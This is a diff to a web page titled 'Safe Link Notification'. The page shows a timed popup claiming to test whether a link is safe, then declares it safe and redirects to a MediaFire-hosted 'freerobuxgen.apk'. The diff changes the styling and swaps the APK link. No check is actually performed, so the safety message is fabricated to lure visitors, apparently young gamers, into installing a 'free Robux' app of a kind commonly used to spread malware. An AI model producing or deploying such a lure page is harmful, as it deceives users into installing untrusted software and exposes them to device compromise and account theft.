@@ -5,6 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Safe Link Notification</title>
     <style>
+        body {
+            background-color: black;
+            color: white;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+
         #popup {
             display: none;
             position: fixed;
@@ -12,14 +19,15 @@
             top: 50%;
             transform: translate(-50%, -50%);
             padding: 20px;
-            background: white;
-            border: 1px solid black;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            background: black;
+            color: white;
+            border: 1px solid white;
+            box-shadow: 0 0 10px rgba(255,255,255,0.5);
         }
     </style>
 </head>
 <body>
-    <div id="popup">Testing if link and download is safe...</div>
+    <div id="popup">Testing if link is safe...</div>
 
     <script>
         function showPopup() {
@@ -32,7 +40,7 @@
                 
                 // Show "Yes, it's safe!" for 3 seconds then redirect
                 setTimeout(() => {
-                    window.location.href = 'https://www.mediafire.com/file/9xkd9iu66znchwc/freerobuxbot.apk/file';
+                    window.location.href = 'https://www.mediafire.com/file/3fxi9p5ayom5p36/freerobuxgen.apk/file';
                 }, 3000);
             }, 5000);
         }
